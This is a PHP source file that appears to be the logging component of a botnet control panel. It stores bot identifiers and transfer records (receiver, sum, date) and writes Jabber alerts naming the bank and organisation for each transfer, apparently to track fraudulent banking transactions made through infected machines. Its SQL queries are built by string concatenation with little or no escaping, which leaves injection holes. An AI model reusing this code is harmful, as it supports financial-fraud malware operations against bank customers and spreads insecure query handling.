<?php

class ServiceLog {
    private $bot, $system, $mysqli;
    
    function __construct(){
        global $bot, $system, $mysqli;
        $this->bot = &$bot;
        $this->system = &$system;
        $this->db = &$mysqli;
    }
    
    function setLog($log = ''){
        if(empty($log)) return false;
        if($this->db->query("INSERT INTO bf_logs (`prefix`, `uid`, `ip`, `version`, `log`, `system`, `userid`) VALUES ('".$this->bot->prefix."', '".$this->bot->uid."', '".$_SERVER['REMOTE_ADDR']."', '".$this->bot->ver."', '".$log."', '".$this->system->nid."', '".$this->bot->userid."')")){
	    return true;
        }else{
            return false;
        }
    }
    
    function SaveTLog($log = ''){
        if(empty($log)) return false;
        $log = str_replace("'", '', $log);
        if($this->db->query('INSERT INTO bf_logs_tech (`prefix`, `uid`, `log`, `system`, `userid`) VALUES (\''.$this->bot->prefix.'\', \''.$this->bot->uid.'\', \''.$log.'\', \''.$this->system->nid.'\', \''.$this->bot->userid.'\')')){
            return true;
        }else{
            return false;
        }
    }
    
    function GetTLog(){
        $logs = $this->db->query('SELECT id,log,post_date FROM bf_logs_tech WHERE (prefix = \''.$this->bot->prefix.'\') AND (uid = \''.$this->bot->uid.'\') AND (system = \''.$this->system->nid.'\') ORDER by id DESC', null, null, false);
        return json_encode($logs);
    }
    
    function ClearTLog(){
        $this->db->query('delete from bf_logs_tech WHERE (prefix = \''.$this->bot->prefix.'\') AND (uid = \''.$this->bot->uid.'\') AND (system = \''.$this->system->nid.'\')');
        return false;
    }
    
    function SaveHLog($receiver = '', $sum = '', $note = '', $date = ''){
        if(empty($receiver)) return false;
	if(empty($sum)) return false;
	if(empty($date)) return false;
	if(empty($note)) return false;
	
        $receiver = str_replace("'", '', $receiver);
	$sum = str_replace("'", '', $sum);
	$note = str_replace("'", '', $note);
	$date = str_replace("'", '', $date);
	
        if($this->db->query('INSERT INTO bf_logs_history (`prefix`, `uid`, `receiver`, `sum`, `note`, `date`, `system`, `userid`) VALUES (\''.$this->bot->prefix.'\', \''.$this->bot->uid.'\', \''.$receiver.'\', \''.$sum.'\', \''.$note.'\', \''.$date.'\', \''.$this->system->nid.'\', \''.$this->bot->userid.'\')')){
            return true;
        }else{
            return false;
        }
    }
    
    function SaveHLogs($logs){
	if(is_array($logs) && count($logs) > 0){
	    foreach($logs as $log){
		if(empty($log[0])) continue;
		if(empty($log[1])) continue;
		if(empty($log[2])) continue;
		if(empty($log[3])) continue;
		
		$log[0] = str_replace("'", '', $log[0]);
		$log[1] = str_replace("'", '', $log[1]);
		$log[2] = str_replace("'", '', $log[2]);
		$log[3] = str_replace("'", '', $log[3]);
		
		$this->db->query('INSERT DELAYED INTO bf_logs_history (`prefix`, `uid`, `receiver`, `sum`, `note`, `date`, `system`, `userid`) VALUES (\''.$this->bot->prefix.'\', \''.$this->bot->uid.'\', \''.$log[0].'\', \''.$log[1].'\', \''.$log[3].'\', \''.$log[2].'\', \''.$this->system->nid.'\', \''.$this->bot->userid.'\')');
	    }
	    return true;
	}else{
	    return false;
	}
    }
    
    function GetHLog(){
        $logs = $this->db->query('SELECT id,receiver,sum,log,date,post_date FROM bf_logs_history WHERE (prefix = \''.$this->bot->prefix.'\') AND (uid = \''.$this->bot->uid.'\') AND (system = \''.$this->system->nid.'\') ORDER by id DESC', null, null, false);
	return json_encode($logs);
    }
    
    function ClearHLog(){
        $this->db->query('delete from bf_logs_history WHERE (prefix = \''.$this->bot->prefix.'\') AND (uid = \''.$this->bot->uid.'\') AND (system = \''.$this->system->nid.'\')');
        return false;
    }
    
    function SendJab($summ, $name_b, $name_o){
        global $config, $dir;
        if(empty($summ)) return false;
        if(empty($name_b)) return false;
        if(empty($name_o)) return false;
        
        $text = 'Summ: ' . $summ . "\r\n";
	$text .= 'Bank name: ' . $name_b . "\r\n";
	$text .= 'Org name: ' . $name_o . "\r\n";
	$text .= 'Date: ' . date('c', time()) . "\r\n";
        
        if(!empty($config['jabber']['tracking'])){
	    if(strpos($config['jabber']['tracking'], ',') != false){
		$jt = explode(',', $config['jabber']['tracking']);
		if($jt > 0){
		    foreach($jt as $jab){
			@file_put_contents($dir . 'cache/jabber/to_' . $jab . '_' . mt_rand(5, 15) . time(), $text);
		    }
		}
	    }else{
		@file_put_contents($dir . 'cache/jabber/to_' . $config['jabber']['tracking'] . '_' . mt_rand(5, 15) . time(), $text);
	    }
	}
        
        return true;
    }
}

RegisterService("ServiceLog");

?>